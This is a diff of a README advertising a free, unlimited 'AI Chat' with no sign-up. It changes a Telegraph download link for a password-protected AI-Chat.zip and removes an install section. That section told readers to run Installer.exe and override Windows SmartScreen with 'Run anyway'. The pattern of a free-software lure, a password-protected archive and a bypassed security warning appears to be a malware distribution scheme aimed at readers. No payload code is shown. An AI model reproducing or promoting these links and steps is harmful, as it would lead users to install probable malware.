@@ -2,7 +2,7 @@
 
 AI Chat - free, unlimited, no sign up
 
-**[AI-Chat.zip](https://telegra.ph/Download-Tutorial-10-28-19)**  
+**[AI-Chat.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ Free AI chat with no sign up and no message limit. Full-power model for writing,
 - **Sign up** — Not needed
 - **Package** — tool.zip
 - **Messages** — No limit
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-19
-2. Download **AI-Chat.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-AIChat-FreeDownload
